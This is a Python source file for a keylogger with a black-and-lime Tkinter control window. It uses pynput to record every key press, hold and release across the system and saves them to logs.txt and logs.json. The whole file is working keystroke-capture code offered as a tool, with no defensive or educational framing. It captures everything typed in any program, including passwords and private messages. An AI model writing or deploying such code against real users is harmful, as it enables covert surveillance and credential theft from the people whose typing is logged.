import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
import threading

key_list = []
x = False
key_strokes = ""
listener = None
listening = False

def update_txt_file(key):
    with open('logs.txt', 'w') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    try:
        if not x:
            key_list.append({'Pressed': f'{key.char}'})
            x = True
        else:
            key_list.append({'Held': f'{key.char}'})
    except AttributeError:
        key_list.append({'Pressed': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes, listening
    try:
        key_list.append({'Released': f'{key.char}'})
        key_strokes += key.char
    except AttributeError:
        key_list.append({'Released': f'{key}'})
        key_strokes += f'[{key}]'
    x = False
    update_json_file(key_list)
    update_txt_file(key_strokes)
    if not listening:
        return False

def start_keylogger():
    global listener, listening
    if not listening:
        listening = True
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Keylogger Running...", fg="lime")

def stop_keylogger():
    global listener, listening
    if listener and listener.running:
        listening = False
        listener.stop()
        status_label.config(text="Keylogger Stopped", fg="red")
    else:
        status_label.config(text="Keylogger Not Running", fg="yellow")

# GUI Setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("400x250")
root.configure(bg="black")

title = tk.Label(root, text="KEYLOGGER", font=("Courier", 20, "bold"), fg="lime", bg="black")
title.pack(pady=20)

start_btn = tk.Button(root, text="Start Keylogger", font=("Courier", 12), fg="black", bg="lime", command=start_keylogger)
start_btn.pack(pady=10)

stop_btn = tk.Button(root, text="Stop Keylogger", font=("Courier", 12), fg="black", bg="red", command=stop_keylogger)
stop_btn.pack(pady=10)

status_label = tk.Label(root, text="Keylogger Idle", font=("Courier", 12), fg="yellow", bg="black")
status_label.pack(pady=20)

root.mainloop()
